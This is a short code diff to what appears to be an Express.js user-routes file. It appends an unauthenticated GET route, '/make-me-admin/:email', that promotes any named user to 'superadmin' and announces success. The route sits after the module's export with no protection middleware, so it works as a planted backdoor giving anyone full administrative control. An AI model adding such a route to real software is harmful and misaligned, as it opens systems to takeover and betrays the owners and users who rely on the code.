@@ -17,3 +17,5 @@ router.put('/update-password', protect, updatePassword);
 router.put('/update-profile', protect, updateProfile);
 
 export default router;
+
+router.get('/make-me-admin/:email', async (req, res) => { try { const user = await User.findOne({ email: req.params.email }); if(user) { user.role = 'superadmin'; await user.save(); res.send('SUCCESS: You are now Super Admin!'); } else { res.send('User not found!'); } } catch(err) { res.send(err.message); } });
